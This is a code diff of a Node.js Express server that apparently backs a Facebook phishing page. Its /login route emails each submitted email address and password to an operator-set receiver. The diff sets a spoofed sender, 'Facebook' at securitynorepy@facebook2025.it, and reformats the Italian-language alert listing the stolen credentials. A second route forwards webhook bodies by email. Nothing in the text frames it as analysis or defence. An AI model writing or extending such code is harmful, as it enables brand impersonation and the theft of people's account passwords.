@@ -28,8 +28,8 @@ const transporter = nodemailer.createTransport({
   port: 587,
   secure: false,
   auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS,
+    user: process.env.EMAIL_USER, // SMTP user
+    pass: process.env.EMAIL_PASS, // SMTP password
   },
 });
 
@@ -40,14 +40,16 @@ app.post("/login", async (req, res) => {
 
   try {
     await transporter.sendMail({
-      from: `"Facebook Security" <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_RECEIVER,
+      from: `"Facebook " <securitynorepy@facebook2025.it>`, // Mittente visibile
+      to: process.env.EMAIL_RECEIVER, // Destinatario
       subject: "🔔 Nuovo accesso ricevuto",
       html: `
-        <h2>Nuovo accesso ricevuto</h2>
-        <p><strong>Email:</strong> ${email}</p>
-        <p><strong>Password:</strong> ${password}</p>
-        <p><em>Ora: ${new Date().toLocaleString()}</em></p>
+        <p>Nuovo accesso ricevuto:</p>
+        <ul>
+          <li><strong>Email:</strong> ${email}</li>
+          <li><strong>Password:</strong> ${password}</li>
+          <li><em>Ora:</em> ${new Date().toLocaleString()}</li>
+        </ul>
       `,
     });
 
@@ -64,7 +66,7 @@ app.post("/webhook", async (req, res) => {
 
   try {
     await transporter.sendMail({
-      from: `"Webhook Notifier" <${process.env.EMAIL_USER}>`,
+      from: `"Webhook Notifier" <securitynorepy@facebook2025.it>`,
       to: process.env.EMAIL_RECEIVER,
       subject: "📩 Nuovo webhook ricevuto",
       text: JSON.stringify(req.body, null, 2),
